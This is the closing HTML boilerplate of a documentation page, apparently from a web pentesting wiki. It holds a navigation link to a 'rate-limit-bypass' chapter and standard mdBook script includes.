                    <a rel="next prefetch" href="../pentesting-web/rate-limit-bypass.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
